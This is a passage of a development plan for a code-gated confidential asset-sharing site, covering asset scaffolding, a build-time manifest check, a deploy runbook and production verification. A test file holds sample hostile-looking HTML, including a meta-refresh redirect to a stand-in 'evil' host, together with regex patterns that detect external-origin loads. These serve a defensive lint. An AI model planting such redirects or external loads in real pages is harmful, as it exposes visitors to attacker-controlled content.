Run: `npm run build`
Expected: success. If `.generated/assets-manifest.json` doesn't exist yet (Phase 6 writes it), `readManifest()` returns `{}` and the dropdown is empty. For a non-empty check now: `mkdir -p .generated && echo '{}' > .generated/assets-manifest.json`.

- [ ] **Step 6: Commit**

```bash
git add src/app/admin/ next.config.ts
git commit -m "feat: admin dashboard — show-once link, no raw-code column, last-used, absolute/duration expiry"
```

**BEFORE marking Phase 5 complete:** confirm the list shows label/status/last-used/**Redemptions** (spec §5) and NEVER the raw code; the one-time link renders after generate; expiry accepts an absolute date or a duration. `npm test` + `npm run build` green. Update banner + table.

---

## Phase 6 — Asset pipeline (generator + manifest)

**Execution Status:** ⬜ NOT STARTED

> Read `docs/pitfalls/implementation-pitfalls.md` → "Cookie Path + opaque slugs". Build step enforces the slug contract that Phase 3 relies on.

### Task 6.1: `new-asset` generator

**Files:**
- Create: `scripts/new-asset.mjs`

- [ ] **Step 1: Implement** `scripts/new-asset.mjs` (scaffold + register the slug's provenance):

```js
import { randomBytes } from "node:crypto";
import { mkdir, writeFile, readFile } from "node:fs/promises";
import path from "node:path";

const title = process.argv.slice(2).join(" ").trim() || "Untitled asset";
const slug = randomBytes(16).toString("base64url"); // 22 chars, 128-bit
const root = process.cwd();

const dir = path.join(root, "assets", slug);
await mkdir(dir, { recursive: true });
await writeFile(
  path.join(dir, "index.html"),
  `<!doctype html>\n<meta charset="utf-8">\n<title>${title}</title>\n<h1>${title}</h1>\n`,
);

// Record provenance so the build can reject a hand-crafted folder (spec §7 D2 backstop).
// .generated/slugs.json is COMMITTED (unlike the manifest, which is a gitignored build artifact).
const regPath = path.join(root, ".generated", "slugs.json");
await mkdir(path.dirname(regPath), { recursive: true });
let reg = [];
try { reg = JSON.parse(await readFile(regPath, "utf8")); } catch { /* first asset */ }
if (!reg.includes(slug)) reg.push(slug);
await writeFile(regPath, JSON.stringify(reg, null, 2) + "\n");

console.log("Created assets/%s/index.html and registered the slug.", slug);
console.log("Slug (opaque):", slug);
```

- [ ] **Step 2: Verify**

Run: `npm run new-asset -- "Test Report"` then `ls assets/` and `cat .generated/slugs.json`
Expected: a 22-char folder with `index.html`, and the slug listed in the registry. Clean up: `rm -rf assets/<slug>` and remove that slug from `.generated/slugs.json`.

- [ ] **Step 3: Commit**

```bash
git add scripts/new-asset.mjs
git commit -m "feat: new-asset generator (opaque 128-bit slug, scaffold + provenance registry)"
```

### Task 6.2: Build-manifest — registry provenance, non-served output, advisory origin scan

> Spec §7: the build writes the confidential manifest to the NON-served `.generated/` path, and
> REJECTS any asset folder whose slug is not in the committed `.generated/slugs.json` registry (the
> registry — not the shape regex — is the D2 backstop). The external-origin scan is a best-effort
> ADVISORY lint over a broadened surface; CSP (§9) is the real containment boundary.

**Files:**
- Create: `scripts/manifest-lib.mjs`, `scripts/build-manifest.mjs`, `scripts/build-manifest.test.ts`
- Modify: `package.json` (`prebuild` hook), `.gitignore`

- [ ] **Step 1: Failing test** `scripts/build-manifest.test.ts` (test the pure checks):

```ts
import { expect, test } from "vitest";
import { extractTitle, externalOriginHits, validateSlug, firstDuplicate } from "./manifest-lib.mjs";

test("extractTitle reads <title>, falls back to slug", () => {
  expect(extractTitle("<title>Hi</title>", "slug00000000000000000a")).toBe("Hi");
  expect(extractTitle("<h1>no title</h1>", "slug00000000000000000b")).toBe("slug00000000000000000b");
});
test("externalOriginHits flags a broadened surface, ignores data:/relative", () => {
  expect(externalOriginHits(`<script src="https://cdn.example/x.js"></script>`)).toContain("src/href");
  expect(externalOriginHits(`<img srcset="https://cdn/x.png 1x">`)).toContain("srcset");
  expect(externalOriginHits(`<style>@import url(https://f/x.css);</style>`)).toContain("css @import");
  expect(externalOriginHits(`<div style="background:url('https://e/x.png')">`)).toContain("css url()");
  expect(externalOriginHits(`<svg><use href="https://e/s.svg#i"/></svg>`)).toContain("svg <use>");
  expect(externalOriginHits(`<meta http-equiv="refresh" content="0;url=https://evil/">`)).toContain("meta refresh");
  expect(externalOriginHits(`<img src="data:image/png;base64,AAAA"><a href="/rel">x</a>`)).toEqual([]);
});
test("validateSlug requires 22 base64url chars", () => {
  expect(validateSlug("A7fK9dZ2qR3sT1uV5wXyB0")).toBe(true);
  expect(validateSlug("acme-corp")).toBe(false);
});
test("firstDuplicate finds a repeated registry entry (reachable dup check)", () => {
  expect(firstDuplicate(["a", "b", "a"])).toBe("a");
  expect(firstDuplicate(["a", "b"])).toBeNull();
});
```

- [ ] **Step 2: Run to verify fail** — `npm test -- build-manifest` → FAIL.

- [ ] **Step 3: Implement the pure lib** `scripts/manifest-lib.mjs`:

```js
export function extractTitle(html, fallback) {
  const m = html.match(/<title>([^<]*)<\/title>/i);
  const t = m?.[1]?.trim();
  return t && t.length > 0 ? t : fallback;
}

/** Best-effort ADVISORY scan (spec §7): returns the external-origin surfaces present. CSP is the
 *  real boundary — this cannot catch runtime-constructed URLs. Broaden here, don't trust it fully. */
export function externalOriginHits(html) {
  const hits = [];
  const add = (re, what) => { if (re.test(html)) hits.push(what); };
  add(/(?:src|href)\s*=\s*["']https?:\/\//i, "src/href");
  add(/srcset\s*=\s*["'][^"']*https?:\/\//i, "srcset");
  add(/@import\s+(?:url\()?\s*["']?\s*https?:\/\//i, "css @import");
  add(/url\(\s*["']?\s*https?:\/\//i, "css url()");
  add(/<use\b[^>]*\bhref\s*=\s*["']https?:\/\//i, "svg <use>");
  add(/<meta\b[^>]*http-equiv\s*=\s*["']refresh["'][^>]*https?:\/\//i, "meta refresh");
  return hits;
}

export function validateSlug(slug) {
  return /^[A-Za-z0-9_-]{22}$/.test(slug);
}

export function firstDuplicate(list) {
  const seen = new Set();
  for (const x of list) { if (seen.has(x)) return x; seen.add(x); }
  return null;
}
```

- [ ] **Step 4: Run to verify pass** — `npm test -- build-manifest` → PASS.

- [ ] **Step 5: Implement the build script** `scripts/build-manifest.mjs`:

```js
import { readdir, readFile, writeFile, stat, mkdir } from "node:fs/promises";
import path from "node:path";
import { extractTitle, externalOriginHits, validateSlug, firstDuplicate } from "./manifest-lib.mjs";

const root = process.cwd();
const assetsDir = path.join(root, "assets");
const outPath = path.join(root, ".generated", "assets-manifest.json");
const fail = (m) => { console.error("FAIL:", m); process.exit(1); };

// The committed registry is the ONLY provenance source (spec §7 D2 backstop).
let registry = [];
try { registry = JSON.parse(await readFile(path.join(root, ".generated", "slugs.json"), "utf8")); } catch { /* none yet */ }
const dup = firstDuplicate(registry);
if (dup) fail(`duplicate slug "${dup}" in .generated/slugs.json`);
const registered = new Set(registry);

const manifest = {};
let entries = [];
try { entries = await readdir(assetsDir); } catch { /* no assets yet */ }

for (const slug of entries) {
  const dir = path.join(assetsDir, slug);
  if (!(await stat(dir)).isDirectory()) continue;
  if (!validateSlug(slug)) fail(`slug "${slug}" is not 22 base64url chars`);
  if (!registered.has(slug)) fail(`slug "${slug}" is not in .generated/slugs.json — asset folders MUST be minted by 'npm run new-asset' (spec §7 D2 backstop)`);
  const html = await readFile(path.join(dir, "index.html"), "utf8").catch(() => null);
  if (html === null) fail(`${slug}/index.html missing`);
  const hits = externalOriginHits(html);
  if (hits.length) fail(`${slug} references external origins [${hits.join(", ")}] — assets must be self-contained (advisory lint; CSP is the enforcement boundary, spec §9)`);
  manifest[slug] = { title: extractTitle(html, slug) };
}

await mkdir(path.dirname(outPath), { recursive: true });
await writeFile(outPath, JSON.stringify(manifest, null, 2) + "\n");
console.log(`Wrote ${outPath} with ${Object.keys(manifest).length} asset(s).`);
```

- [ ] **Step 6: Wire `prebuild` + gitignore.** Add to `package.json` scripts: `"prebuild": "node scripts/build-manifest.mjs"`. Append to `.gitignore` (ignore the manifest artifact; KEEP `.generated/slugs.json` tracked):

```
/.generated/assets-manifest.json
```

- [ ] **Step 7: Verify end-to-end**

Run: `npm run new-asset -- "Demo"` then `npm run build-manifest` then `cat .generated/assets-manifest.json`
Expected: manifest lists the demo slug with title "Demo". Clean up: `rm -rf assets/<slug> .generated/assets-manifest.json` and remove the demo slug from `.generated/slugs.json`.

- [ ] **Step 8: Commit**

```bash
git add scripts/ package.json .gitignore .generated/slugs.json
git commit -m "feat: build-manifest — registry provenance check, non-served output, advisory origin scan"
```

**BEFORE marking Phase 6 complete:** confirm the build FAILS on (a) a 22-char folder NOT in the registry, (b) a non-22-char slug, (c) an external-origin reference across the broadened surface, and (d) a duplicated registry entry. Confirm the manifest is written under `.generated/` (NOT `assets/`). `npm test` green. Update banner + table.

---

## Phase 7 — Deploy pipeline & isolation

**Execution Status:** ⬜ NOT STARTED

> Mostly infra/config + human-in-the-loop Vercel/Neon dashboard steps. Read spec §10, §11.

### Task 7.1: Neon databases + Vercel env vars (human-assisted)

**Files:**
- Create: `docs/deploy/SETUP.md` (runbook)

- [ ] **Step 1: Write the runbook** `docs/deploy/SETUP.md` documenting exactly:
  - **Branches (spec §11):** create BOTH `main` (production) and `dev` (integration). Vercel production
    branch = `main`; `dev` and PRs get preview deployments. Work flows `dev` → PR → `main` (Task 7.3).
  - Create a Vercel project linked to `github.com/oren-datanation/share-site`; production branch = `main`.
  - **Preview DB is schema-only — NEVER a clone of prod (spec §10, §15 Q3):** provision the preview
    `DATABASE_URL` as an EMPTY database with migrations applied — do NOT `neon branch create` from the
    prod/`main` branch (a Neon branch is a copy-on-write clone that would copy real, valid codes into the
    less-trusted preview environment). Verify the preview DB has zero rows in `codes`.
  - **Preview also gates `/a/*` (spec §10/§11):** admin-production-only is not enough — preview bundles
    and serves confidential asset HTML. The gate route already returns the generic page when
    `VERCEL_ENV !== 'production'` (Task 3.2). **§15 Q3 owner decision:** if you need to QA the gate on
    preview, replace that branch with a preview-only shared-secret check instead of hardcoding the
    generic-page behavior — document whichever you choose here. Either way the preview DB stays schema-only.
  - **Env vars per environment (spec §10):** `DATABASE_URL` (prod → `main` branch DB; preview → the
    empty preview DB), `SESSION_SECRET` + `ASSET_COOKIE_SECRET` (distinct per env; each a **key ring** —
    `<kid>:<secret>` entries, current kid first), `PRODUCTION_ORIGIN` (the canonical prod URL, for CSRF),
    `ADMIN_PASSWORD_HASH` (from `node scripts/hash-password.mjs <password>`), `ADMIN_TOTP_SECRET` (from
    `node scripts/totp-setup.mjs`). `VERCEL_ENV` is injected by Vercel.
  - **Secret rotation via key rings (spec §10):** to rotate, prepend a new `<kid>:<secret>` to the ring
    and keep the previous entry until existing tokens age out, then drop it. Never a flag-day swap.
  - **Exposure response ≠ rotation (spec §3/§8/§10):** the response to a *suspected code exposure* is
    **revoke + reissue** the affected codes in `/admin` — NOT rotating `ASSET_COOKIE_SECRET` (that only
    cycles cookies and leaves a leaked code usable).
  - **Backups/exports are confidential (spec §11):** even with codes hashed, the DB holds `asset_slug`,
    recipient **labels (client identities)**, and usage — encrypt exports at rest, restrict access, set a
    retention limit, keep labels minimal. Keep an occasional export (free-tier PITR is limited) so a DB
    loss doesn't permanently lock out all recipients.
  - **Log & access hygiene (spec §3 D4, §8):** the reusable code transits the URL, so set Vercel log
    retention to the minimum, restrict who can read deployment logs (do NOT assume that population equals
    the code-minters — CI/integrations may see logs), and lock down Vercel project access (anyone with it
    can read/rotate env vars and thus mint codes).

- [ ] **Step 2: Commit**

```bash
git add docs/deploy/SETUP.md
git commit -m "docs: deploy setup runbook (Neon branches, per-env secrets)"
```

### Task 7.2: Gated, main-only migration release step

**Files:**
- Create: `.github/workflows/migrate.yml`

- [ ] **Step 1: Implement** `.github/workflows/migrate.yml` (runs migrations only on push to `main`, forward-only — spec §11):

```yaml
name: db-migrate
on:
  push:
    branches: [main]
concurrency:
  group: db-migrate
  cancel-in-progress: false
jobs:
  migrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 24 }
      - run: npm ci
      - run: npm run db:migrate
        env:
          DATABASE_URL: ${{ secrets.PROD_DATABASE_URL }}
```

> Add `PROD_DATABASE_URL` as a GitHub Actions secret (the production/main Neon branch URL). `concurrency` with `cancel-in-progress: false` serializes migrations (advisory-lock equivalent — spec §11).

- [ ] **Step 2: Commit**

```bash
git add .github/workflows/migrate.yml
git commit -m "ci: gated main-only forward-only DB migration workflow"
```

### Task 7.3: Full production verification

- [ ] **Step 1: Publish via the `dev` → PR → `main` flow, let Vercel deploy, run the real end-to-end flow** on production:
  1. `npm run new-asset -- "Verification"` on `dev`; commit; open a PR into `main`; merge → migration workflow (Task 7.2) runs; Vercel deploys `main`.
  2. **Preview gate:** on the PR's preview URL, `curl -sS "<preview>/a/<slug>"` → the generic page (NOT the asset), confirming `/a/*` is inert on preview; `/admin` on preview also → generic page.
  3. In production `/admin/login`: sign in with password + TOTP → reach `/admin`. Wrong password → generic error; confirm a wrong password does not lock you out (throttle only).
  4. Generate a code for the Verification asset; the **one-time link is shown once** — copy it. Confirm the codes list shows label/status/last-used/redemptions and **no raw code**.
  5. Open the link in a fresh browser → 302 → asset renders. Confirm the URL bar has no `?code=`; check response headers include `cache-control: no-store`, `strict-transport-security`, `x-content-type-options: nosniff`, and a CSP with `frame-ancestors 'none'`.
  6. Revoke the code in `/admin`; reload the asset → generic failure page (instant revoke). `curl -sI "<prod>/a/<slug>"` after revoke → failure body; `curl "<prod>/robots.txt"` → `Disallow: /`.
  7. **No plaintext code at rest:** inspect the production `codes` table (or a schema dump) — confirm there is a `code_hash` column and NO `code` column, and that no row stores a raw code.

- [ ] **Step 2: Record results** in the plan's Execution Status (Discoveries if anything deviated).

**BEFORE marking Phase 7 complete:** all seven verification substeps pass on the real production URL, including the preview-gate and no-plaintext-code checks. Update banner + table + Overall.

---

## Final self-review (run after all phases planned/executed)

- **Spec coverage (against the REVISED spec):**
  - **§4 D5 (no static surface):** `force-dynamic` on `/a/[slug]` (Task 3.2) + `/admin` (Task 5.2) + lazy DB client (Task 2.1).
  - **§5 (data model, DB time, hashed codes, atomic increments):** Task 2.1 (`code_hash`, DB default, TIMESTAMPTZ, indexed limiter) + Task 2.2 (`hashCode`) + Task 3.4 (atomic rate increment) + Task 4.2 (TOTP-step prune).
  - **§6 (gate/tokens):** atomic redeem + fail-closed recheck (Task 3.1); route with precedence, DB-capped cookie, uniform failure, missing-file alert (Task 3.2); key-ring tokens (Task 2.4).
  - **§7 (storage/manifest/registry/serving):** Task 6.1 (registry) + Task 6.2 (registry check, `.generated` manifest, advisory scan) + Task 1 (bundling spike, 22-char slug) + tracing (Tasks 3.4/5.2).
  - **§8 (admin):** argon2id + scripts (Task 4.1); TOTP-after-password, CSRF pinned origin, login throttle, key-ring session, fail-closed prod gate (Task 4.3); show-once + last-used + orphan panel (Task 5.2).
  - **§9 (headers/CSP/rate limiting):** shared header builder + site-wide headers (Tasks 3.2/3.3); admin CSP (Task 4.3); bucketed + global + valid-cookie-exempt limiter (Task 3.4).
  - **§10/§11 (secrets/envs/pipeline):** schema-only preview DB, `/a/*` preview gate, key rings, exposure-response, backups, log hygiene, `dev` branch, gated migrations (Tasks 3.2/4.3/7.1/7.2).
  - **§12 order** = phase order (spike first). **§13 tests** = per-task unit + DB-integration + the Phase-3/4 header/security-property/route-composition gates. **§14 YAGNI** respected. **§15** surfaced as Open owner decisions (see above; Q1/Q2/Q3 mapped to Tasks 3.2/5.2/7.1).
- **No placeholders:** every code step has real, runnable code — no TBDs. The ONLY intentional
  placeholder is `.env.test`'s `ADMIN_PASSWORD_HASH`, explicitly fulfilled by Task 4.1 Step 6.
- **Type consistency (defined once, reused):** `CodeRow` (inferred from the schema — has `code_hash`,
  never `code`), `codeStatus`, `KeyRing`/`AssetClaims`, `Redeemed`, `Manifest`, `CreateResult`. The
  manifest shape `{ [slug]: { title } }` is consistent across Tasks 3.4/5.1/5.2/6.2, and it is read
  from `.generated/assets-manifest.json` everywhere (never `assets/manifest.json`). No task references
  the removed `CodeRepo`/`redeemCode`/`recheckCode`/`isCodeValid`/`defaultExpiry`/`checkRateLimit` symbols.
